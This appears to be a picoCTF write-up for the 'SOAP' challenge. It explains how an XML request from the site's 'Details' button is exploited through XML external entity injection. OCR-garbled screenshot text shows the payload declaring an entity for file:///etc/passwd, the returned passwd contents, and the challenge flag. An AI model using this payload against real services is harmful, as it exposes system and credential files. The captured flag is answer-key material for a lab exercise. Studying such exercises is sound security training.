# SOAP
> The web project was rushed and no security assessment was done. Can you read the /etc/passwd file?

## About the Challenge
We were given a simple website, here is the preview of the website


[Image extracted text: Computer Science
We have been ranked to be among the best universities in the worldl
Sicioegie
CyLab-Africa
Carnegie Mellon University Security and
iInitiative
University
picoCtf
Africa
Upanzi NETWORK
Carnegie Mellon University Africa Offers
PicoCTF A free Computer Security
Upanzi Network an inititiave aimed at
3 masters
degree programs
education program:
driving financial inclusion:
Details
Details
Details
Privacy]


## How to Solve?
If we press `Details`, we will see this HTTP request


[Image extracted text: Pretty
Raw
Hex
POST
[ daca
HTTP/1-1
Host
aturn-Picoct f
net ; 58313
User-
Hozilla/5
(Vindous
IT
0; Vin64 ;
{64;
rv:109
Accept
Accept-Language
en-US ,en;(-0
Lecept-Encoding:
gzip ,
deflace
Re ferer
http: / /saturn-picoct
net : 58312/
Content
Type
applicat
on / *1l
Content-
Lengch:
Origin:
http
( ( saturn-Picoct f
net
58313
Connect
on:
close
Xll
Version-
encoding=
UTF-8"2 >
data>
<ID>
<[ID>
data>
gent]


The first thing that comes to my mind is XXE vulnerability. So as the chall says, we need to read `/etc/passwd` file to obtain the flag. 

Im using this GitHub repository to find the correct payload (You can check the repo [here](https://github.com/payloadbox/xxe-injection-payload-list)) And here is the HTTP request to read `/etc/passwd` file


[Image extracted text: Send
Cancel
Request
Response
Pretty
Raw
Hex
Pretty
Raw
Hex
Render
POST
[daca
HTIP/11
HTTP/1.1
200
Or
Host
sacurn-Picoct
net
58313
Server
Werlzeug/?-2_
3 Python/ 3_
User-
gent
Hozilla/5
(Vindous
IT
Vin64;
*64;
rv:109
Gecko/:O1OO101
Date
Tue
28 Har
2023 16:27:10
GHT
Firefor 111
Content
Type
text /hcul
charset-ut f-8
Accept
"/#
Content-
Lengch:
1023
Lccept-Language
En
US ,en;4-0_
Connect
on -
close
Aecept
Encoding:
szip ,
deflace
Re ferer
http:
saturn
Picoct
net : 58312/
Invalid
ID :
root
30:0-root
[root: /bin/bash
Content-
Type
application/ xnl
daemon *1:
daemon: /u51 / sbin: /uSr
sbin/nologin
Content
Lengch:
130
bin:% 2 Ebin: /bin: /uSr / sbin/nologin
Origin:
http
Isaturn-picoct f
net
58312
11
sys:*:3:3:sys: /dev: /usr/sbin/no
gin
Connect
on :
close
12
sync:*:4:65534:sync: /bin: /bin/ sync
Janes:*: 5:60: James: /uSr / ganes: /usr /sbin/nologin
rnl
version-
enco
ding=
UTF-8"?>
14
man:* 6:13-man: /var / cache / man: /usr
sbin/nologin
IDOCTTPE
replace
ENTITY
enc
STSTEH
file:/ / [etc/passud"
15
lp: *
7 : 7: 1p
Ivar
Spool/ lpd: /us / sbin/nologin
{dac a>
mail:*8: 8-mail: /var/mail:/usr / sbin/nologin
<ID:
nets
%9:
:nevs: /var /
spool/nevs: /uSr /sbin/nologin
Cent
18
uucp
x10: 10: uucp
Ivar / spool/uucp
(usr / sbin/nologin
<[ID>
19
proxy:*:13:13:proxy: /bin: /usr/sbin/nologin
cata>
20
VUU-data:*: 33: 33: UUU-data: /var _
VUU: /usx
sbin/nologin
21 backup
x:34:34:backup
Ivar /backups: /uSr / sbin/nologin
list %38-38
Hailing
List
Hanager: /var /list: /uSr
sbin/nologin
23
irc:x:39:39:ired: /var/run/ircd
{uS /sbin/no_
ogin
cats
341:41: Gnats
Reporting Systen
ad1n /
Ivar / lib / cats: /USr / sbin/nologin
25
nobody:*:65534:65534:nobody: /noneriscent
[usr/sbin/nologin
2€
apt
x100:65534:
(nonexistent
{usr / sbin/nol
27
flask:*:999:999:
app
(bin/ sh
Picoctf:x:[OOl:picocTF (YIL_
3xtern@l
3nt lcty_
7927544}
Seorcni
matches
Seorcni
matches
Bug-_
ogin]


```
picoCTF{XML_3xtern@l_3nt1t1ty_e79a75d4}
```